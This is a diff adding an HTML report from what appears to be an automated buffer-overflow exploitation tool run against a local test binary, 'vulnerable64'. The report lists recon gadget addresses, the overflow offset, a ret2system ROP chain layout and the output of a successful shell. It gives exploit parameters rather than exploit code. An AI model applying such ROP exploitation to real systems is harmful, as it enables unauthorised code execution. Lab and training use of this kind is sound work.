@@ -1,0 +1,35 @@
+<!DOCTYPE html><html><head><title>BOF64 Report</title>
+<style>
+body { font-family: monospace; background:#111; color:#eee; padding:20px; }
+h1 { color:#ff5555; } h3 { color:#55ff55; border-bottom:1px solid #333; }
+pre { background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }
+</style></head><body>
+<h1>64-bit Buffer Overflow Report</h1>
+<p><b>Binary:</b> ./vulnerable64</p>
+<p><b>PIE:</b> False | <b>Canary:</b> False | <b>NX:</b> None</p>
+<p><b>Timestamp:</b> 2026-10-25T18:40:11.068697</p>
+<p><b>Findings:</b> 2</p>
+<ul><li>control_rip</li><li>exploit.shell</li></ul>
+<h3>recon</h3><pre>{
+  "system_plt": "0x4010b4",
+  "bin_sh": "0x404060",
+  "pop_rdi_ret": "0x401363",
+  "ret": "0x40101a"
+}</pre><h3>fuzz</h3><pre>{
+  "crash_size": 80
+}</pre><h3>offset</h3><pre>{
+  "offset": 72
+}</pre><h3>control_rip</h3><pre>{
+  "crashed": true
+}</pre><h3>rop_chain</h3><pre>{
+  "offset": 72,
+  "pop_rdi": "0x401363",
+  "bin_sh": "0x404060",
+  "ret": "0x40101a",
+  "system": "0x4010b4",
+  "total_length": 104
+}</pre><h3>exploit</h3><pre>{
+  "shell": true,
+  "output": "Enter input: PWNED_PROJECT_54\nuid=1000(saad) gid=1000(saad) groups=1000(saad),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(docker)\nDONE\n"
+}</pre>
+</body></html>
